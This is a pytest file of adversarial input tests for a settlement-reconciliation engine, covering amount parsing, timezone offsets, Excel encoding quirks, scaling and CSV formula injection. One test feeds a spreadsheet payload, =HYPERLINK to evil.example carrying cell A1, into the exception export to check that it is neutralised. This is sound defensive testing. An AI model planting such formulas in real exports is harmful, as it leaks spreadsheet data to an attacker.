"""Adversarial tests: the batch a real bank sends, and the reviewer who is not on your side.

Every other test file here checks that the engine is right about data this
repository generated. These check what happens when the input did not come from
the generator -- because in production it never does. A settlement export is a
file somebody's ops team produced from a system you do not control, opened in
Excel, saved again, and emailed; a bank narration carries text a customer typed.

The tests are grouped by the real-world event that produces the input, not by
the module under attack, because the question a reviewer asks is "what happens
when the file is like this", not "is _paise correct".

WHAT MAKES A FAILURE HERE SERIOUS

    This project's own standard is that a wrong number is worse than no number.
    So the bar for input handling is not "does not crash". It is:

        parse it correctly, or refuse it loudly.

    Silently reading 1_000 as 1000, or dropping a UTC offset and landing on the
    wrong calendar day, is the failure mode that matters -- the books still look
    clean and nobody notices.
"""

from __future__ import annotations

import csv
import dataclasses
import shutil
from datetime import datetime
from pathlib import Path

import pytest

from recon.datagen import Family, GenConfig, generate
from recon.datagen.io import write_dataset
from recon.match.controller import reconcile
from recon.match.exceptions import build_exception_list, write_exceptions
from recon.match.normalize import NormalizationError, load_batch


@pytest.fixture(scope="module")
def clean(tmp_path_factory) -> Path:
    out = tmp_path_factory.mktemp("adversarial")
    write_dataset(
        generate(GenConfig(n_records=500, seed=42, family=Family.DEVELOPMENT)), out
    )
    return Path(out)


def _mutate(clean: Path, tmp_path: Path, filename: str, edit) -> Path:
    """Copy the batch, rewrite one file through ``edit``, return the new batch."""
    directory = tmp_path / "batch"
    shutil.copytree(clean, directory)
    path = directory / filename
    with path.open(newline="", encoding="utf-8") as handle:
        rows = list(csv.DictReader(handle))
    fields = list(rows[0].keys())
    edit(rows)
    with path.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=fields)
        writer.writeheader()
        writer.writerows(rows)
    return directory


# --------------------------------------------------------------------------
# "the amount column came out of a spreadsheet"
# --------------------------------------------------------------------------


# Python's int() accepts every one of these. Most of them happen to convert to
# what a human would read, so this is a contract finding rather than a
# demonstrated money error -- and it is worth being precise about that, because
# overstating a finding is the same failure this project warns about, pointed
# the other way. The parser advertises "integer paise" and refuses a decimal
# point on the grounds that guessing units is worse than stopping. These slip
# through the same door: values it accepts without having decided to.
AMBIGUOUS_AMOUNTS = [
    ("1_000", "PEP 515 underscore separator -- int() reads 1000"),
    ("+500", "explicit plus sign"),
    ("١٢٣", "Arabic-Indic digits -- no ASCII digit present"),
]


@pytest.mark.parametrize("raw,why", AMBIGUOUS_AMOUNTS, ids=[a for a, _ in AMBIGUOUS_AMOUNTS])
def test_an_amount_that_is_not_plain_integer_paise_is_refused(clean, tmp_path, raw, why):
    """Parse it correctly or refuse it -- never quietly agree with int().

    The parser refuses a decimal point because "a silent rupees/paise mix-up is
    a hundredfold error". These reach the same field by a different route and
    int() swallows them. They are not demonstrated hundredfold errors -- each
    converts to roughly what it looks like -- so the finding is that a money
    parser is accepting shapes it never decided to accept, on the boundary where
    this project has decided that guessing is worse than stopping.
    """
    def edit(rows):
        rows[0]["gross_effect_paise"] = raw

    batch = _mutate(clean, tmp_path, "settlement_detail.csv", edit)
    with pytest.raises(NormalizationError):
        load_batch(batch)


@pytest.mark.parametrize("raw", ["1\u00a0000", "1,000", "₹1000", "1e3"])
def test_the_guards_that_already_worked_still_work(clean, tmp_path, raw):
    """Recorded because they pass.

    Interior separators, currency symbols and exponents were already refused,
    and a stricter parser must not be credited with catching what was never
    getting through. Trailing whitespace -- a non-breaking space included -- is
    stripped and the value parses, which is correct handling and deliberately
    not listed as a hazard above.
    """
    def edit(rows):
        rows[0]["gross_effect_paise"] = raw

    batch = _mutate(clean, tmp_path, "settlement_detail.csv", edit)
    with pytest.raises(NormalizationError):
        load_batch(batch)


def test_a_decimal_amount_is_still_refused(clean, tmp_path):
    """The guard that already worked must survive the stricter one."""
    def edit(rows):
        rows[0]["gross_effect_paise"] = "1234.56"

    batch = _mutate(clean, tmp_path, "settlement_detail.csv", edit)
    with pytest.raises(NormalizationError):
        load_batch(batch)


def test_a_negative_amount_still_parses(clean, tmp_path):
    """Refunds are negative. Strictness must not become a new bug.

    Applied to a REFUND line, because the loader already refuses a payment line
    with non-positive gross -- a guard worth noting on the way past, since it is
    the kind of invariant that is usually missing.
    """
    def edit(rows):
        refund = next(row for row in rows if row["line_type"] == "REFUND")
        refund["gross_effect_paise"] = "-2501"

    batch = _mutate(clean, tmp_path, "settlement_detail.csv", edit)
    loaded = load_batch(batch)
    assert any(line.gross_effect_paise == -2501 for line in loaded.details)


def test_a_payment_line_with_non_positive_gross_is_already_refused(clean, tmp_path):
    """Recorded because it passes: the loader checks this and should keep doing so."""
    def edit(rows):
        payment = next(row for row in rows if row["line_type"] == "PAYMENT")
        payment["gross_effect_paise"] = "-2501"

    batch = _mutate(clean, tmp_path, "settlement_detail.csv", edit)
    with pytest.raises(NormalizationError, match="non-positive"):
        load_batch(batch)


# --------------------------------------------------------------------------
# "the export came from a system that stamps timezones"
# --------------------------------------------------------------------------


def test_a_timestamp_carrying_an_offset_is_refused(clean, tmp_path):
    """An offset that is accepted and then dropped moves money by a day.

    ``DetailLine.settlement_day`` is ``settled_at.date()``. That takes the
    calendar day in whatever offset the string carried, so
    ``2026-06-05T23:30:00-08:00`` -- which is the 6th in UTC -- is read as the
    5th. The recovery window is 0..4 days wide, so a one-day shift can admit a
    candidate the window should have rejected or reject one it should have
    admitted, on a field that decides where money is attributed.

    Normalising instead of refusing would mean picking a timezone for the
    merchant, which is not this parser's decision to make. So it refuses, in
    the same spirit as the units guard on amounts.
    """
    def edit(rows):
        rows[0]["settled_at"] = rows[0]["settled_at"] + "-08:00"

    batch = _mutate(clean, tmp_path, "settlement_detail.csv", edit)
    with pytest.raises(NormalizationError):
        load_batch(batch)


def test_a_mixed_offset_batch_is_refused_rather_than_compared(clean, tmp_path):
    """One row with a Z among naive rows is the realistic version of this."""
    def edit(rows):
        rows[0]["settled_at"] = rows[0]["settled_at"] + "Z"

    batch = _mutate(clean, tmp_path, "settlement_detail.csv", edit)
    with pytest.raises(NormalizationError):
        load_batch(batch)


def test_naive_timestamps_are_unaffected(clean):
    """The batch as generated must keep loading. Strictness is not a rewrite."""
    assert load_batch(clean).details


# --------------------------------------------------------------------------
# "the ops team opened the file in Excel and saved it"
# --------------------------------------------------------------------------


def test_a_utf8_bom_does_not_hide_the_first_column(clean, tmp_path):
    """Excel writes UTF-8 with a BOM, and it lands on the first header cell.

    Read as plain utf-8, the first column is named ``\\ufeffbank_row_id`` and the
    loader reports the column as missing -- an error that sends an operator
    looking for a schema problem that does not exist. The file is fine; the
    reader was strict about the wrong thing.
    """
    directory = tmp_path / "bom"
    shutil.copytree(clean, directory)
    path = directory / "bank_statement.csv"
    path.write_bytes(b"\xef\xbb\xbf" + path.read_bytes())

    loaded = load_batch(directory)
    assert loaded.bank_by_utr


def test_crlf_line_endings_load(clean, tmp_path):
    """Windows line endings are what a re-saved file has."""
    directory = tmp_path / "crlf"
    shutil.copytree(clean, directory)
    path = directory / "bank_statement.csv"
    path.write_bytes(path.read_bytes().replace(b"\n", b"\r\n"))

    assert load_batch(directory).bank_by_utr


# --------------------------------------------------------------------------
# "the operator opened the exception queue in Excel"
# --------------------------------------------------------------------------


FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")


def test_the_exception_queue_cannot_carry_a_spreadsheet_formula(clean, tmp_path):
    """The deliverable is a CSV a finance operator opens in Excel.

    Excel evaluates any cell beginning ``=``, ``+``, ``-``, ``@``, tab or
    carriage return as a formula, and ``=HYPERLINK(...)`` exfiltrates whatever
    the sheet can see the moment somebody clicks it. In this repository the
    evidence strings are generated, but in production they carry bank narration
    and gateway payment descriptions -- text a paying customer chooses. That is
    attacker-controlled input reaching an operator's spreadsheet through the one
    artifact this project asks a human to open.

    Note what is NOT asserted: that the text is altered beyond recognition. The
    operator still has to be able to read the evidence, so the fix has to make
    the cell inert without destroying it.
    """
    run = reconcile(clean)
    items = build_exception_list(run)
    assert items

    hostile = dataclasses.replace(
        items[0],
        evidence='=HYPERLINK("http://evil.example/?"&A1,"click me")',
        recommended_action="+1+1",
        category="@SUM(1+9)",
    )
    path = write_exceptions((hostile,) + items[1:], tmp_path / "exceptions.csv")

    with path.open(newline="", encoding="utf-8") as handle:
        rows = list(csv.reader(handle))
    live = [
        cell
        for row in rows[1:]
        for cell in row
        if cell[:1] in FORMULA_LEADERS
    ]
    assert live == [], f"cells Excel would execute: {live[:3]}"


def test_neutralising_a_formula_keeps_the_evidence_readable(clean, tmp_path):
    """An operator has to be able to work the queue afterwards."""
    run = reconcile(clean)
    items = build_exception_list(run)
    hostile = dataclasses.replace(items[0], evidence="=2+2 refund of pay_ABC")
    path = write_exceptions((hostile,), tmp_path / "exceptions.csv")

    body = path.read_text(encoding="utf-8")
    assert "refund of pay_ABC" in body


def test_ordinary_evidence_is_written_unchanged(clean, tmp_path):
    """The guard must not touch the 99.9% of rows that were never dangerous."""
    run = reconcile(clean)
    items = build_exception_list(run)
    ordinary = [item for item in items if item.evidence[:1] not in FORMULA_LEADERS]
    assert ordinary

    path = write_exceptions(tuple(ordinary), tmp_path / "exceptions.csv")
    with path.open(newline="", encoding="utf-8") as handle:
        written = {row["case_id"]: row["evidence"] for row in csv.DictReader(handle)}
    for item in ordinary:
        assert written[item.case_id] == item.evidence


# --------------------------------------------------------------------------
# "we process rather more than five hundred payments"
# --------------------------------------------------------------------------


def test_the_verdict_stage_does_not_rebuild_its_indexes_per_case(clean, monkeypatch):
    """Throughput measured at 500 records is not throughput.

    Profiling at 8,000 records put more than half the runtime in
    ``LadderRun.claims_by_settlement`` and ``attributed_detail_ids`` -- whole-run
    indexes rebuilt once per case, which is quadratic in the batch. Measured
    end-to-end: 500 records at 48k records/sec, 20,000 at 1.3k, a 37x collapse
    over a 40x increase in size. (Two further costs were found and removed the
    same way: gate 1's index, and gate 8 re-solving the whole batch's matching
    once per candidate rather than one connected component's.)

    Asserting a wall-clock number would be flaky on a shared runner, so the
    property is asserted instead: these indexes are built a bounded number of
    times per run, not once per case. That is the thing that was wrong, and it
    is the thing that stays fixed.
    """
    from recon.match import controller

    calls = {"claims": 0, "attributed": 0}
    real_claims = controller.LadderRun.claims_by_settlement
    real_attributed = controller.LadderRun.attributed_detail_ids.fget

    def counted_claims(self):
        calls["claims"] += 1
        return real_claims(self)

    def counted_attributed(self):
        calls["attributed"] += 1
        return real_attributed(self)

    monkeypatch.setattr(controller.LadderRun, "claims_by_settlement", counted_claims)
    monkeypatch.setattr(
        controller.LadderRun, "attributed_detail_ids", property(counted_attributed)
    )

    run = reconcile(clean)
    cases = len(run.verdicts)
    assert cases > 50

    assert calls["claims"] <= 4, (
        f"claims_by_settlement rebuilt {calls['claims']} times for {cases} cases"
    )
    assert calls["attributed"] <= 4, (
        f"attributed_detail_ids rebuilt {calls['attributed']} times for {cases} cases"
    )


@pytest.mark.slow
def test_throughput_does_not_collapse_with_batch_size(tmp_path):
    """A generous bound on the shape of the curve, not on the machine.

    Ten times the records may cost more than ten times the time -- there is real
    per-settlement work -- but it must not cost a hundred times it. The bound is
    deliberately loose so this fails on a complexity regression rather than on a
    noisy runner.
    """
    import time

    timings = {}
    for records in (500, 5000):
        directory = tmp_path / str(records)
        write_dataset(
            generate(GenConfig(n_records=records, seed=555003, family=Family.PRIMARY)),
            directory,
        )
        started = time.perf_counter()
        reconcile(directory)
        timings[records] = time.perf_counter() - started

    growth = timings[5000] / max(timings[500], 1e-6)
    # 72x before any of this; 17x once the two accidental quadratics went; 12.5x
    # once gate 8 stopped re-solving the whole batch per candidate. The bound
    # sits well above the measurement so this fails on a complexity regression
    # rather than on a noisy runner, and well below the figure it started at so
    # the regression it caught cannot come back unseen.
    assert growth < 25, f"10x the records cost {growth:.0f}x the time: {timings}"
